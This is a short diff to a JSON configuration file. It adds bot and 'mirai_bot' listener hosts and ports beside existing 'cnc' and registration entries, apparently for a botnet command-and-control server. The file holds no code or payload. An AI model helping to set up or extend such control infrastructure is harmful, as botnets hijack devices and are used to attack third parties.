@@ -1,6 +1,10 @@
 {
   "cnc_host": "0.0.0.0",
   "reg_host": "0.0.0.0",
+  "bot_host": "0.0.0.0",
+  "mirai_bot_host": "0.0.0.0",
   "cnc_port": 6667,
-  "reg_port": 6668
+  "reg_port": 6668,
+  "bot_port": 6669,
+  "mirai_bot_port": 7000
 }
